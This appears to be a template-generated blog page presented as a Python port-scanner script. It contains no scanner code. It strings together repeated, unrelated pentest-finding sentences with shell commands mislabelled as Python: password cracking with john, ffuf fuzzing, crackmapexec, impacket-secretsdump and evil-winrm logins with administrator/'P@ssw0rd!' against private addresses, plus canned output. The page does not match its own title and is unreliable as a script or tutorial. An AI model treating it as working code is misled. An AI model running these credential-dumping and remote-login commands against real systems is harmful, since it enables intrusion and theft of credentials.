---
TitleSEO: "Automated Port Scanner in Python | ZureFX"
TitlePost: "Automated Port Scanner — Python"
Author: "ZureFX"
Description: "A Python script for automated port scanner. Built for security research and automation."
Keywords: "bash, parser, scanner, python"
URL: "https://zurefx.github.io/scripting/script-automated-port-scanner-539.html"
URL_IMAGES: ""
Date: "2025-08-31"
Tags: "Bash, Parser, Scanner, Python"
Section: "scripting"
Lang: "en"
main_img: "script-automated-port-scanner-539"
Permalink: "/scripting/script-automated-port-scanner-539.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit. The database credentials were hardcoded in the application source code.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `feroxbuster`
- `GetUserSPNs`
- `john`

## Implementation

### Core Logic

Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine.

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.56.132.254/FUZZ
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Unconstrained delegation was enabled on the compromised machine.

### Helper Functions

The scheduled task ran with elevated privileges and could be abused for escalation. Group Policy Preferences contained encrypted but recoverable credentials.

```python
crackmapexec smb 10.28.70.36 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.129.147.219
```

## Usage

### Basic Usage

Privilege escalation was possible due to misconfigured sudo permissions. Initial enumeration revealed several interesting open ports on the target.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.128.108.105 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

Privilege escalation was possible due to misconfigured sudo permissions. Token impersonation allowed elevation to SYSTEM privileges on the target. The application stored sensitive credentials in an unencrypted configuration file.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.15.114.121/FUZZ
nmap -sCV -p135,23,5986 10.115.117.170 -oN scan.txt
```

## Output

### Example Output

The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory.

```
[+] Scanning target...
[+] Found 1 results
[+] Done in 24.90s
```
